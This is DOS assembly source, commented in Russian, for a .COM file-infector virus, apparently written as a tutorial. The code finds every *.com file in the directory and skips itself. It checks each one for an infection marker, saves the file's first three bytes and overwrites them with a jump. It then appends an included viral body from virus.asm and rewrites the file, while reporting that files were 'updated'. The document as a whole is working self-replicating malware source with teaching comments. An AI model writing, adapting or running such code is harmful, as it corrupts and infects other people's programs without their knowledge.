﻿						;Всё, что следует за значком ";" - это комментарий.

.286						;Разрешает ассемблирование   непривилегированных   инструкций
       						;процессора 80286  (реальный  режим) и инструкций арифметического
       						;сопроцессора 80287.

CSEG segment    				;Даём имя сегменту, а точнее определяем абсолютный 
						;сегмент в памяти программ по определённому адресу.
						;Имя нашего сегмента будет CSEG.

assume cs:CSEG, ds:CSEG, es:CSEG, ss:CSEG       ;Задаём сегментные регистры, которые будем использовать для
       						;вычисления действующего адреса для всех меток и переменных, опре-
       						;делённых  для  сегмента  или группы сегментов с указанным именем.
						;У нас их четыре, - CS, DS, ES, SS и они будут указывать на наш 
						;единственный сегмент (мы его назвали CSEG). 

org 100h 					;Устанавливаем счётчик инструкций в текущем сегменте в  соот-
       						;ветствии с адресом, задаваемым "выражением".
						;Сейчас этот счётчик равен 100h - используется для всех программ 
						;типа .com

begin:						;Метка начала программы.

mov ah,1Ah                                      ;Установим DTA в конец файла.
mov dx,offset Finish
int 21h

call Find_first					;Ищем первый файл.
jc Message_bad					;Нет txt-файлов - на выход.

goto_cycle:					;Начало цикла.

mov si,offset Finish
add si,1Eh
mov di,offset File_name_test
mov cx,8					;Длина сравниваемых строк
repe cmpsb					;Случайно мы нашли не test.com?
je call_label2
                                            
mov ax,3D02h					;Загружаем в регистр ah число 3Dh (функция открытия
						;файла с записью), а в al число 02h (пишем в конец).
						;Можно было записать и так - mov ah,3Dh
						;mov al,02h

mov dx,offset Finish                            ;Указываем адрес файла в DTA (по умолчанию он 80h от начала PSP,
add dx,1Eh                                      ;+1Eh - наше имя файла.
int 21h						;Выполняем функцию.

mov Handle,ax					;При открытии файлу будет присвоен номер, его и
						;сохраняем для дальнейших действий,
mov bx,ax					;а заодно и сохраняем его в bx.

mov ah,3Fh 					;Читаем файл
mov cx,1024                                     ;с длиной 1Кб.
mov dx,offset Finish
add dx,100h                                     ;DX устанавливаем за DTA.
int 21h						;Выполняем функцию.

mov si,offset Name_virus                        ;Проверяем, "заражён" ли файл.
mov di,ax
add di,dx
sub di,5					;DI установлен на считанного конец файла - 5 байт (начало метки).
mov cx,5
repe cmpsb
je close_file

push ax                                         ;В стеке - число реально прочитанных байт.

mov si,offset Finish                            ;Переносим 3 байта c начала программы в конец.
add si,100h					;Но она располагается чуть дальше (зарезервируем длину PSP)!
add ax,offset Finish                            ;Число прочитанных байт прибавляем к адресу начала программы.
add ax,100h                                     ;Плюс длина PSP.
mov di,ax		                        ;В di - адрес области за всем файлом.
mov cx,3                                        ;Перемещаем (сохраняем) 3 байта.
rep movsb

add ax,3					;В ax хранится адрес начала области нашей программы восстановления.
push ax

mov si,offset Finish
add si,100h					;В si - адрес начала нашей считанной программы.
mov byte ptr cs:[si],0E9h		        ;Первый байт = jmp

pop ax
pop cx
push ax                                         ;Нехитрой комбинацией устанавливаем в cx количество байт программы.
        
mov si,offset Finish
add si,100h					;Не забываем прибавлять 100h.
inc si
mov word ptr cs:[si],cx                         ;Ещё два байта = адрес, куда "прыгать".

pop ax
push ax                                         ;В ax хранится адрес начала области нашей программы восстановления.

mov si,offset Add_nop                           ;Переносим х байт c адреса смещения Add_nop
mov di,ax                                       ;в конец нашей программы, за нашими сохранёнными байтами.
						;Сколько байт переносить?
mov ax,offset Add_nop
mov cx,offset End_nop
sub cx,ax                                       ;В cx - длина тела нашей "внутренней" программы.

pop ax                                          ;В ax хранится адрес начала области нашей программы восстановления.
sub ax,offset Finish
sub ax,100h					;Уберём длину затесавшегося PSP.
add ax,cx					;В ax - новая длина файла.
push ax						;Запоминаем ax.

rep movsb

mov dx,0h					;Устанавливаем указатель с начала файла +0h.
mov cx,0h                                       ;+0h мы указали потому, что будем
mov ax,4200h                                    ;перезаписывать считанный файл с первого байта.
int 21h                                         


mov ah,40h                                      ;Записываем программу (в т.ч.$) из смещения Finish 
mov dx,offset Finish	                        ;по адресу, указанному выше.
add dx,100h
pop cx						;В cx - длина записываемой нами программы. Стек обнулён.
int 21h                                         

close_file:
mov ah,3Eh                                      ;Используем функцию закрытия файла.
mov bx,Handle                                   ;Для закрытия обязательно "вспоминаем" его номер,
						;номер у нас был сохранён в Handle.
int 21h                                         ;Выполняем функцию.

call_label2:
call Find_next					;Ищем следующий файл.
jnc goto_cycle					;Нашли ещё один файл; прыгаем на метку.

Message_ok:					;Подпрограмма успешного вывода строки и выхода.
mov ah,9					;Выводим строку.
mov dx,offset Mess_ok
int 21h
int 20h
  
Message_bad: 					;Подпрограмма вывода сообщения об ошибке и выхода.
mov ah,9
mov dx,offset Mess_bad
int 21h
int 20h   

Add_nop equ $                                   ;Будущие строчки в конце файла.

include virus.asm                               ;Чтобы не марать этот файл, будем писать в новом.

End_nop equ $					;Конец нашей внедряемой программы.

Find_first proc                                 ;Подпрограмма поиска первого файла.
mov ah,4Eh					;Ищем первый файл по маске (функция 4Eh).
xor cx,cx					;Атрибуты обычные. Смотрим, что в CX.
mov dx,offset File_name 			;Адрес маски в DS:DX
int 21h						;В DTA заносится имя найденного файла.
ret
Find_first endp
                                                ;Подпрограмма поиска следующего файла.
Find_next proc
mov dx,offset Finish				;DS:DX указывают на DTA.
xor cx,cx	                                ;CX=0.
mov ah,4Fh    		                        ;4Fh - поиск следующего файла.
int 21h                                         ;В DTA заносится имя найденного файла.
ret
Find_next endp
         
File_name db '*.com',0				;Маска файла.

File_name_test db 'TEST.COM',0,'!$'

Mess_ok db 'Файлы найдены и обновлены. Всем спасибо.$'      ;Успешное сообщение и сообщение об ошибке (ниже).

Mess_bad db 'Файлы не найдены. Поместите файлы *.com в каталог с программой.$'

Handle dw 0FFFFh                                ;Определяем переменную (для идентификатора файла).

Finish equ $					;Метка конца нашей программы!

CSEG ends
end begin